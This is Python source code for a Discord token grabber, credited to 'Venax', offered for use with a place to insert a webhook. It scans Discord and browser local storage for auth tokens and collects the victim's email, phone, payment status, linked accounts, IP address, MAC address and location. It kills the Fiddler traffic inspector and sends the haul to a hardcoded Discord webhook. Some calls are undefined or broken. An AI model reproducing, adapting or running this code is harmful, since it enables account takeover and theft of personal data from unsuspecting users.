import os, re, json, psutil, requests, threading
from urllib.request import Request, urlopen
from getmac import get_mac_address as gma
from json import loads, dumps
from base64 import b64decode
from re import findall

# Input your webhook here
userwh = "https://discord.com/api/webhooks/1057743103680843826/sMDWeqeStLUM8VUvwZahxXl9YA6wj0lBV2UGbuoGID0JnNs2r-p4Q3HCh-q2NL-7V6s4"

try:
    LOCAL = os.getenv("LOCALAPPDATA")
    ROAMING = os.getenv("APPDATA")
    TEMP = os.getenv("TEMP")
    try:
        data = requests.get("https://utilities.tk/network/info").json()
        global ipaddr
        ipaddr = data['ip']
    except:
        data = requests.get("https://ipinfo.io/json").json()
except:
    pass

def killfiddler():
    for proc in psutil.process_iter():
        if proc.name() == "Fiddler.exe":
            proc.kill()
threading.Thread(target=killfiddler).start()

# I deleted Opera path because it makes crash the grabber for some people.
PATHS = {
    "Discord"           : ROAMING + "\\Discord",
    "Discord Canary"    : ROAMING + "\\discordcanary",
    "Discord PTB"       : ROAMING + "\\discordptb",
    "Google Chrome"     : LOCAL + "\\Google\\Chrome\\User Data\\Default",
    "Brave"             : LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
    "Yandex"            : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
}
def getheaders(token=None):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
    if token:
        headers.update({"Authorization": token})
    return headers
def getuserdata(token):
    try:
        r = post(CHECKER_API_URL, json={'token':token})
        if r.status_code == 200:
            return loads(urlopen(Request("https://discordapp.com/api/v9/users/@me", headers=getheaders(token))).read().decode())
        elif r.status_code == 429:
            return " Error"
        elif r.status_code == 401:
            return " Invalid"
        elif r.status_code == 403:
            return f" Locked - '{r.json()['username']}'"
        else:
            return " Error"
    except:
        pass
def gettokens(path):
    path += "\\Local Storage\\leveldb"
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                for token in findall(regex, line):
                    tokens.append(token)
    return tokens
def getavatar(user, avatar):
    url = f"https://cdn.discordapp.com/avatars/{user}/{avatar}.gif"
    try:
        urlopen(Request(url))
    except:
        url = url[:-4]
    return url
def has_payment_methods(token):
    try:
        return bool(len(loads(urlopen(Request("https://discordapp.com/api/v9/users/@me/billing/payment-sources", headers=getheaders(token))).read().decode())) > 0)
    except:
        pass

def main():
    cache_path = ROAMING + "\\.cache~$"
    embeds = []
    working = []
    checked = []
    already_cached_tokens = []
    working_ids = []
    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue
        for token in gettokens(path):
            if token in checked:
                continue
            checked.append(token)
            uid = None
            if not token.startswith("mfa."):
                try:
                    uid = b64decode(token.split(".")[0].encode()).decode()
                except:
                    pass
                if not uid or uid in working_ids:
                    continue
            user_data = getuserdata(token)
            if not user_data:
                continue
            working_ids.append(uid)
            working.append(token)
            username = user_data["username"] + "#" + str(user_data["discriminator"])
            user_id = user_data["id"]
            avatar_id = user_data["avatar"]
            avatar_url = getavatar(user_id, avatar_id)
            email = user_data.get("email")
            phone = user_data.get("phone")
            bio = user_data.get("bio")
            banner_id = user_data.get("banner")
            lang = user_data.get("locale").upper()
            nsfw = user_data.get("nsfw_allowed")
            verified = user_data.get("verified")
            if user_data.get("premium_type") == 0:
                nitro = "False"
            elif user_data.get("premium_type") == 1:
                nitro = "Classic"
            elif user_data.get("premium_type") == 2:
                nitro = "Booster"
            billing = bool(has_payment_methods(token))
            connections = (requests.get("https://discordapp.com/api/v9/users/@me/connections", headers=getheaders(token)).text).replace("[", "").replace("]", "").replace("{", "").replace("}", "").replace('"', "").replace(",", " /")
            if not connections:
                connections = "There are no linked accounts"
            embed = {
                "color": 0x000000,
                "fields": [
                    {
                        "name": "𝘋𝘐𝘚𝘊𝘖𝘙𝘋",
                        "value": f"Email : {email} [{verified}]\nPhone : {phone}\nNitro : {nitro}\nBilling : {billing}\nNSFW : {nsfw}\nLanguage : {lang}",
                        "inline": True
                    },
                    {
                        "name": "𝘊𝘖𝘔𝘗𝘜𝘛𝘌𝘙",
                        "value": f'MAC : {(gma()).replace(":", "-").upper()}\nIP: {ipaddr.text}\nUsername : {os.getenv("UserName")}\nHostname : {os.getenv("COMPUTERNAME")}\nLocation : {platform}\nVille : {data["city"]}',
                        "inline": True
                    },
                    {
                        "name": "𝘛𝘖𝘒𝘌𝘕",
                        "value": f"``{token}``\n",
                        "inline": False
                    },
                    {
                        "name": "𝘊𝘖𝘕𝘕𝘌𝘊𝘛𝘐𝘖𝘕𝘚",
                        "value": f'``{connections}``\n',
                        "inline": False
                    },
                ],
                "author": {
                    "name": f"{username}  [{user_id}]",
                    "icon_url": avatar_url
                    },
                "thumbnail": {
                    "url": f"https://cdn.discordapp.com/banners/{user_id}/{banner_id}.gif"
                    },
                      "footer": {
                    "text": bio,
                    }
            }
            embeds.append(embed)
    with open(cache_path, "a") as file:
        for token in checked:
            if not token in already_cached_tokens:
                file.write(token + "\n")
    if len(working) == 0:
        working.append("123")
    webhook = {
        "content": "",
        "embeds": embeds,
        "username": " ",
    }
    try:
        urlopen(Request(userwh, data=dumps(webhook).encode(), headers=getheaders()))
    except:
        pass
try:
    main()
except:
    pass

# Token grabber coded by Venax, Github : venaxyt / YouTube : youtube.com/VENAX59
